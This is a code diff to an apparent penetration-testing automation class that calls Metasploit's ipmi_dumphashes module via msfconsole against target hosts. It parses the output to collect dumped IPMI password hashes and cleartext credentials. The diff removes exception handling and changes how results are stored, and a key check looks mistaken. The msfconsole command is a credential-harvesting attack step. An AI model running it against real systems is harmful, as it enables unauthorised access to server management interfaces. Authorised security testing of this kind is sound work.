@@ -22,22 +22,19 @@ class IPMISolverClass(BaseSolverClass):
             
             result = ", ".join(h.ip for h in self.hosts)
             command = ["msfconsole", "-q", "-x", f"color false; use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {result}; set THREADS {args.threads}; run; exit"]
-            try:
-                result = subprocess.run(command, text=True, capture_output=True)
-                matches = re.findall(r, result.stdout)
-                for m in matches:
-                    if m[0] not in hashes:
-                        hashes[m[0]] = []
-                    hashes[m[0]].append(f"{m[1]}")
-                    
-                matches = re.findall(r1, result.stdout)
-                for m in matches:
-                    if m[0] not in hashes:
-                        creds[m[0]] = []
-                    creds[m[0]].append(f"{m[1]}:{m[2]}")
-                        
-            except Exception as e:
-                self._print_exception(e)
+
+            result = subprocess.run(command, text=True, capture_output=True)
+            matches = re.findall(r, result.stdout)
+            for m in matches:
+                if m[0] not in hashes:
+                    hashes[m[0]] = []
+                hashes[m[0]] = m[1]
+                
+            matches = re.findall(r1, result.stdout)
+            for m in matches:
+                if m[0] not in hashes:
+                    creds[m[0]] = []
+                creds[m[0]] = f"{m[1]}:{m[2]}"
             
             if hashes:
                 print("IPMI hashes dumped:")
